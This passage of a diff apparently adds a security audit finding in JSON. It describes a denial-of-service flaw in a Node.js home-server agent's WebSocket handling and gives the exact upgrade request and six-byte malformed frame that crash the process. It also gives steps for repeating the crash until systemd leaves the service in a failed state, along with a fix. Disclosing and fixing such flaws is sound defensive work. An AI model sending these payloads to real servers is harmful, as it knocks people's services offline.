+        "file": "agents/gv4/artifacts/result_1.txt",
+        "line": 10,
+        "description": "Authenticated connection with valid login cookie and the same RSV1 frame also caused stock Node.js to exit with code 1."
+      },
+      {
+        "file": "agents/gv4/artifacts/result_1.txt",
+        "line": 12,
+        "description": "5 successive crashes were triggered in 1.6s, verifying that repeated crashes trip systemd StartLimitBurst=5 within the 60s window."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None. The fatal frame works on a cross-origin upgrade the agent already rejected, and on a matching-Origin upgrade with no session cookie."
+      },
+      {
+        "kind": "network_routing",
+        "description": "Direct TCP reachability to port 3000 on the local network (all interfaces 0.0.0.0 by default) is confirmed. For remote traffic through dash.<domain> via Cloudflare Tunnel, reachability is conditional: cloudflared and Cloudflare's edge proxy terminate and re-frame WebSocket connections; whether malformed protocol frames (such as RSV1 or unmasked frames) are forwarded to localhost:3000 or rejected at the edge/tunnel proxy is outside repository source visibility and requires owner observation."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Default ws options (no per-socket error listener or maxPayload override) and stock systemd unit configuration (home-cloud.service.template: Restart=always, RestartSec=5s, StartLimitIntervalSec=60s, StartLimitBurst=5)."
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "The frame only needs to arrive while the socket is still in the close handshake; a frame pipelined after the upgrade or after the 1008 close frame is sufficient. No race with close was required in testing."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Unauthenticated client on the LAN (http://<host>:3000) with no session cookie, or any client with direct TCP access to the HTTP port.",
+      "payloads": [
+        "GET /terminal HTTP/1.1\r\nHost: <host>:3000\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: <base64>\r\nSec-WebSocket-Version: 13\r\nOrigin: http://rebind.attacker.test\r\n\r\n",
+        "c1 80 01 02 03 04"
+      ],
+      "instructions": [
+        "Start the unmodified agent in the sandbox with dummy PASSWORD, JWT_SECRET, and BASE_DIR on 127.0.0.1 using stock Node.js.",
+        "Open /terminal with a foreign Origin and no cookie; read the 101 response and the 1008 'Origin rejected' close frame.",
+        "Send the six-byte masked RSV1 frame (c1 80 01 02 03 04) without waiting for the close handshake.",
+        "Observe the child process exit with code 1; repeat with a matching Origin and no cookie using unmasked 81 00, and with a valid dummy login cookie and the RSV1 frame.",
+        "Control: repeat the upgrade without sending a frame and confirm the process stays alive.",
+        "Trigger 5 successive crashes within 60s to demonstrate exceeding the systemd StartLimitBurst threshold."
+      ],
+      "observed_result": "All connections completed the HTTP upgrade with 101. The no-frame control stayed alive. The foreign-Origin frame produced an unhandled EventEmitter error on stock Node.js, exiting with code 1 (status code 1002 protocol error). The matching-Origin, no-cookie unmasked frame produced the same exit with code 1. The authenticated connection also killed the process. 5 successive crashes were triggered in 1.6s, well within the 60s systemd StartLimitIntervalSec window."
+    },
+    "remediation": {
+      "strategy": "Attach an 'error' listener to every WebSocket the server accepts, before any close or dispatch, so protocol errors are contained to that socket (log and terminate it). As defense in depth, reject disallowed upgrades earlier with server.on('upgrade') or a noServer WebSocketServer, and set a small maxPayload.",
+      "code_changes": [
+        {
+          "file_name": "agent/index.js",
+          "fixed_code": "const wss = new WebSocketServer({ server, maxPayload: 1024 * 1024 });\n\nwss.on(\"connection\", (socket, request) => {\n\tsocket.on(\"error\", (err) => {\n\t\tconsole.warn(\"[ws] client error:\", err.message);\n\t\tsocket.terminate();\n\t});\n\n\tif (isShuttingDown) {\n\t\tsocket.close(1001, \"Server is shutting down\");\n\t\treturn;\n\t}\n\t// ... existing origin/path checks and dispatch\n});"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "A single six-byte frame on an unauthenticated WebSocket upgrade reliably crashes the server with no credentials, user interaction, or race condition required for any LAN client."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "The agent process terminates immediately, dropping every dashboard, API, and terminal session. Repeated 5 times within 60 s, it trips systemd StartLimitBurst=5 and permanently leaves the service in a failed state until manual administrator intervention. Cloudflare tunnel child is also killed, removing remote access entirely."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Independently verified against the real agent application with stock Node.js in the approved isolated sandbox; complete source trace from connection upgrade to unhandled 'error' event; confirmed control test remains alive; confirmed 5 rapid crashes trip the burst window."
+    }
+  }
+]
